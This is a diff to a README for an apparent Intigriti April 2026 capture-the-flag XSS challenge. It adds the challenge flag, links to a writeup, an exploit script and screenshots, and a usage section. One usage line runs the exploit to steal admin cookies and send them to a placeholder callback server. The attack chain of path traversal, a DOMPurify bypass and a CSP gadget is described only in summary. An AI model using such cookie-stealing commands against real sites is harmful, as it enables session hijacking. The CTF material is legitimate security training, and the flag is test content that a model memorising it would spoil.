@@ -1,5 +1,7 @@
 # Intigriti April 2026 Challenge — Northstar Notes XSS
 
+**Flag**: `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`
+
 Stored XSS via chained path traversal + hidden reader presets API + DOMPurify full-mode bypass + strict-dynamic CSP gadget.
 
 ## Quick Summary
@@ -10,6 +12,17 @@ The challenge app has a panel manifest loading mechanism where the `panel` URL p
 
 - [`solve/writeup.md`](solve/writeup.md) — Detailed writeup with exploitation steps
 - [`solve/exploit.py`](solve/exploit.py) — Automated exploit script
+- [`solve/screenshots/`](solve/screenshots/) — Proof screenshots
+
+## Usage
+
+```bash
+# Trigger alert(document.domain)
+python solve/exploit.py
+
+# Steal admin cookies
+python solve/exploit.py https://your-callback-server.com
+```
 
 ## Exploit URL
 
